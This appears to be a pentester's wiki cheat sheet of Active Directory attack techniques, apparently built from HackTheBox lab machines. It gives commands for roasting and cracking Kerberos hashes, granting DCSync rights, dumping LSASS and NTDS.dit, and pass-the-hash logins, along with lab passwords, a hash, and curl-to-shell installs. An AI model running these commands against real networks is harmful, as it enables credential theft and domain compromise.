---
layout: wiki
title: Internals - Active Directory Resources
cate1: Internal
cate2: Active Directory
description: Notes about Active Directory
keywords: Internals
---

# Initial Enumeration
[Password Spraying via Sprayhound](https://github.com/Hackndo/sprayhound)
  - Checks badpwdcount attribute only in the domain policy

[Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)

**Requires:** Guest read access to IPC$ (Remote IPC) SMB File Share 
```
nxc smb 10.10.10.192 -u 'guest' -p '' --rid-brute > sid.txt
cat sid.txt | awk -F': ' '{print $2}' | awk '{print $1}' | sed 's/BLACKFIELD\\//' > users.txt
GetNPUsers.py BLACKFIELD/ -usersfile users.txt -format hashcat
hashcat -m 18200 creds.txt /usr/share/wordlists/rockyou.txt
```

[LDAPSearch Cheat Sheet](https://notes.benheater.com/books/active-directory/page/ldapsearch)
```
Domain Contexts: ldapsearch -x -H ldap://BLACKFIELD -s base namingcontexts
Search Users: ldapsearch -x -H ldap://BLACKFIELD -D 'CN=support,CN=users,DC=BLACKFIELD,DC=local' -W -b 'DC=BLACKFIELD,DC=local' '(objectClass=user)'
```

Other resources
  - https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/

[LDAP Domain Dump via Linux](https://github.com/dirkjanm/ldapdomaindump)

Old tool however useful if Bloodhound.py isn't working as intended.

[Integrated DNS Dump](https://github.com/dirkjanm/adidnsdump)
Any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer.

Additional Resources:
  - https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/

[BloodHound CE](https://github.com/SpecterOps/BloodHound)

**Installation via Docker:** [BloodHound Community Edition](https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose)
```
curl -L https://ghst.ly/getbhce | docker compose -f - up
```

[BloodHound.py for Linux](https://github.com/dirkjanm/BloodHound.py)
```
python3 bloodhound.py -u "support" -p "#00^BlackKnight" -c ALL -d BLACKFIELD.local -ns 10.10.10.192 -dc dc01.BLACKFIELD.local
```

# Active Directory Exploitation
[ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)

[WriteDACL - BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl)

[Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)

[NTLMRelay](https://www.thehacker.recipes/ad/movement/ntlm/relay)

[DCSync - secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)

**With PowerView**:
```
whoami /all
Add-ADGroupMember -Identity "Exchange Windows Permissions" -members svc-alfresco
net group "Exchange Windows Permissions" /add svc-alfresco
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
Add-ObjectACL -PrincipalIdentity test123 -Credential $cred -Rights DCSync
Get-DomainUser -Identity svc-alfresco
Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "svc-alfresco" }
```

[SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)

[Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)

**Requires:** Domain Credentials

**Targets:** Service Accounts with SPNs registered on the domain to retrieve TGS tickets containing the SPN hashes.

```
GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```

## Lateral Movement
[ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)

**Requires:** `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` on Object

```
net rpc password AUDIT2020 -U BLACKFIELD\\support -S BLACKFIELD.local (prompts new password)
```

## Credential Dumping
[LSASS Dump - lsass.DMP](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)

**Requires:** Credential Guard to be disabled.

```
Dumping LSASS via Linux: https://medium.com/@offsecdeer/dumping-lsass-remotely-from-linux-efc47391e56d
```

[Pypykatz - Mimikatz for Linux](https://github.com/skelsec/pypykatz)

**Requires:** A DMP file containing credentials extracted to our Linux machine.
```
pypykatz lsa minidump lsass.DMP
```

## Domain Escalation
[Backup Operator - Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)
```
whoami /all (SeBackupPrivilege Enabled)

diskshadow /s backup.txt
robocopy /b E:\Windows\ntds . ntds.dit (NTDS file)
reg save hklm\system c:\temp\system.bak (System Hive keys)

## Other Resources
https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#ac58
```

-----------------------------------------------------------------------

## Active Directory Tools
[NetExec](https://github.com/Pennyw0rth/NetExec)
```
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh (install Rust)
source $HOME/.cargo/env
pipx install git+https://github.com/Pennyw0rth/NetExec
```

[PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
```. .\powerview.ps1```

**NSE**
```--script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln*```

**SMB**
Enum4Linux
SMBMap
smbclient
smbclient.py (Impacket)
[NetExec - Cheatsheet](https://github.com/BlWasp/NetExec-Cheatsheet)
[SMB Enumeration Cheatsheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)

**WinRM**
[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
```
evil-winrm -i 10.10.10.192 -u "svc_backup" -H "9658d1d1dcd9250115e2205d9f48400d"
```

[Impacket]()
```
python3 -m pipx install impacket
  - **PSExec**
    - Shell access via SMB shares (Pass the Hash) 
  - **GetNPUsers**
    - Kerberos Pre-authentication disabled (ASREPRoasting)
```

## Resources
 - [The Hacker Recipes](https://www.thehacker.recipes/)
 - [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
